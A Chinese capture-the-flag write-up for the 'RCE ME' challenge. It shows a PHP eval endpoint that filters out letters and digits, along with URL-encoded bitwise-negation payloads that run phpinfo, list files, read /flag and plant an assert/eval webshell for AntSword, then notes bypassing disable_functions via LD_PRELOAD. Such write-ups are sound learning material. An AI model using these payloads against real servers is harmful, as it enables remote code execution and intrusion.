# \[极客大挑战 2019]RCE ME

\[极客大挑战 2019]RCE ME

## 考点

* 无字母数字RCE
* PHP7参数解析特性
* 取反bypass代码执行

## wp

```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
  $code=$_GET['code'];
  if(strlen($code)>40){
    die("This is too Long.");
  }
  if(preg_match("/[A-Za-z0-9]+/",$code)){
    die("NO.");
  }
  @eval($code);
}else{
  highlight_file(__FILE__);
}
```

`eval`的字符串不能出现字母和数字，并且长度不超过40

可以使用取反进行绕过对字符的限制

```
phpinfo() => (~%8F%97%8F%96%91%99%90)(); 

print_r(scandir('./')) => (~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)(("./")));

readfile("/flag") => (~%8D%9A%9E%9B%99%96%93%9A)((~%D0%8D%9A%9E%9B%99%93%9E%98));
```

`phpinfo()`有disable\_functions，考虑使用一句话

```
assert('eval($_POST[1])') => (~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6);
```

蚁剑连接

![](<../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1).png>)

再绕过disable\_functions

![](<../.gitbook/assets/image (15) (1) (1) (1).png>)

![](<../.gitbook/assets/image (9) (1) (1) (1) (1).png>)

## 小结

1. [深入浅出LD\_PRELOAD & putenv()](https://www.anquanke.com/post/id/175403)
